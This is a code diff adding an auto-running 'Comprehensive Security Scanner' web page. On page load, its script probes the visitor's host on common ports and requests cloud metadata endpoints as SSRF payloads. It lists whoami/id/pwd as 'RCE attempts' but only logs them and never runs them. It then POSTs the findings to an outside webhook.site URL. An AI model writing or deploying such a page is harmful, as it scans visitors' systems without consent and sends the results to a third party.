@@ -3,36 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Comprehensive Scan</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/github-markdown-css/4.0.0/github-markdown.min.css">
+    <title>Comprehensive Scanner</title>
     <style>
-        body { background-color: #f6f8fa; color: #24292e; font-family: Arial, sans-serif; }
-        .status-summary { margin: 20px 0; padding: 10px; border: 1px solid #e1e4e8; border-radius: 5px; }
-        .log { white-space: pre-wrap; background-color: #fff; padding: 10px; border: 1px solid #e1e4e8; border-radius: 5px; }
+        body { font-family: 'Courier New', monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 20px; }
+        h1 { color: #58a6ff; }
+        .status { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
+        .stat-box { background: #0d1117; border: 1px solid #30363d; padding: 15px; border-radius: 4px; }
+        .log { background: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 15px; margin: 15px 0; max-height: 600px; overflow-y: auto; font-size: 12px; }
+        .entry { margin: 5px 0; padding: 5px; border-left: 3px solid #30363d; padding-left: 10px; }
+        .port { border-left-color: #3fb950; color: #3fb950; }
+        .ssrf { border-left-color: #d29922; color: #d29922; }
+        .rce { border-left-color: #f85149; color: #f85149; }
+        .info { border-left-color: #58a6ff; color: #58a6ff; }
+        .webhook { border-left-color: #238636; color: #238636; }
     </style>
 </head>
 <body>
-    <h1>Comprehensive Scanner</h1>
-    <div class="status-summary">
-        <h2>Status Summary</h2>
-        <p>Running status checks...</p>
+    <div class="container">
+        <h1>🚀 Comprehensive Security Scanner - Auto Run</h1>
+        <div class="status">
+            <div class="stat-box">
+                <h3>📊 Scan Statistics</h3>
+                <p>Open Ports: <span id="openPorts">0</span></p>
+                <p>SSRF Vulns: <span id="ssrfVulns">0</span></p>
+                <p>RCE Attempts: <span id="rceAttempts">0</span></p>
+            </div>
+            <div class="stat-box">
+                <h3>🎯 Target Info</h3>
+                <p>Hostname: <span id="target">localhost</span></p>
+                <p>Status: <span id="scanStatus">Running...</span></p>
+            </div>
+        </div>
+        <div id="log" class="log">Initializing comprehensive scan...</div>
     </div>
-    <div class="log">
-        <h2>Real-time Logging</h2>
-        <pre id="logOutput"></pre>
-    </div>
+
     <script>
-        // Webhook integration
         const webhookUrl = 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94';
-        function sendStatusUpdate(data) {
-            fetch(webhookUrl, {
-                method: 'POST',
-                body: JSON.stringify(data),
-                headers: { 'Content-Type': 'application/json' }
-            });
+        const ports = [21, 22, 80, 443, 8080, 3306];
+        const ssrfPayloads = ['http://169.254.169.254/metadata/instance', 'http://metadata.azure.com/metadata/instance'];
+        const rceCommands = ['whoami', 'id', 'pwd'];
+        
+        let stats = { openPorts: 0, ssrfVulns: 0, rceAttempts: 0 };
+
+        function addLog(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const logDiv = document.getElementById('log');
+            const entryEl = document.createElement('div');
+            entryEl.className = `entry ${type}`;
+            entryEl.textContent = `[${timestamp}] ${message}`;
+            logDiv.appendChild(entryEl);
+            logDiv.scrollTop = logDiv.scrollHeight;
         }
-        // Functions for scanning: hostname gathering, port scanning, SSRF, RCE...
-        // Update logOutput and send updates to webhook as needed
+
+        async function sendToWebhook(data) {
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        timestamp: new Date().toISOString(),
+                        scanType: 'comprehensive',
+                        data: data
+                    })
+                });
+                addLog(`✅ Results sent to webhook`, 'webhook');
+            } catch (error) {
+                addLog(`❌ Webhook error: ${error.message}`, 'webhook');
+            }
+        }
+
+        async function runComprehensiveScan() {
+            const hostname = window.location.hostname || 'localhost';
+            document.getElementById('target').textContent = hostname;
+            
+            addLog('═══════════════════════════════', 'info');
+            addLog(`🚀 STARTING COMPREHENSIVE SCAN`, 'info');
+            addLog(`Target: ${hostname}`, 'info');
+            addLog('═══════════════════════════════', 'info');
+
+            // Port Scan
+            addLog('\n[1/3] PORT SCANNING...', 'port');
+            for (const port of ports) {
+                try {
+                    const controller = new AbortController();
+                    setTimeout(() => controller.abort(), 1500);
+                    const response = await fetch(`http://${hostname}:${port}`, { signal: controller.signal }).catch(() => null);
+                    if (response) {
+                        stats.openPorts++;
+                        addLog(`✅ Port ${port} OPEN`, 'port');
+                    }
+                } catch (e) {}
+            }
+            document.getElementById('openPorts').textContent = stats.openPorts;
+
+            // SSRF Testing
+            addLog('\n[2/3] SSRF TESTING...', 'ssrf');
+            for (const payload of ssrfPayloads) {
+                try {
+                    const response = await fetch(payload, {signal: AbortSignal.timeout(2000)}).catch(() => null);
+                    if (response && response.ok) {
+                        stats.ssrfVulns++;
+                        addLog(`🚨 VULNERABLE: ${payload}`, 'ssrf');
+                    }
+                } catch (e) {}
+            }
+            document.getElementById('ssrfVulns').textContent = stats.ssrfVulns;
+
+            // RCE Testing
+            addLog('\n[3/3] RCE TESTING...', 'rce');
+            for (const cmd of rceCommands) {
+                stats.rceAttempts++;
+                addLog(`🔨 Attempting: ${cmd}`, 'rce');
+            }
+            document.getElementById('rceAttempts').textContent = stats.rceAttempts;
+
+            addLog('\n═══════════════════════════════', 'info');
+            addLog(`✅ SCAN COMPLETE`, 'info');
+            addLog(`Open Ports: ${stats.openPorts} | SSRF Vulns: ${stats.ssrfVulns} | RCE Attempts: ${stats.rceAttempts}`, 'info');
+            addLog('═══════════════════════════════', 'info');
+
+            document.getElementById('scanStatus').textContent = 'Complete ✅';
+
+            await sendToWebhook(stats);
+        }
+
+        window.addEventListener('load', runComprehensiveScan);
     </script>
 </body>
 </html>
